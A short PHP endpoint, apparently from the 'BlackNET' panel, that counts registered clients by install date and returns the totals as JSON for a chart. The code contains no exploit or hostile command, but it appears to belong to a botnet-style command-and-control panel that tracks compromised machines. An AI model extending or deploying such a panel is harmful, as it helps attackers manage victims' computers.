<?php
header("Content-Type: application/json");
require_once '../config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$clients = new BlackNET\Clients($database, $utils);

$arrays = [];
$date = [];
$count = [];

if ($clients->countClients() > 0) {
    foreach ($clients->selectInfoFromClients('insdate') as $dd) {
        array_push($date, $dd->insdate);
    }

    foreach ($date as $d) {
        array_push(
            $arrays,
            [
                "label" => $d,
                "data" => $clients->countClientsByCond("insdate", $d)
            ]
        );
    }

    foreach ($arrays as $c) {
        if (!$utils->findKeyValue($count, "label", $c['label'])) {
            array_push($count, $c);
        }
    }
} else {
    array_push($count, ["label" => "Nothing", "data" => 0]);
}

echo json_encode($count);
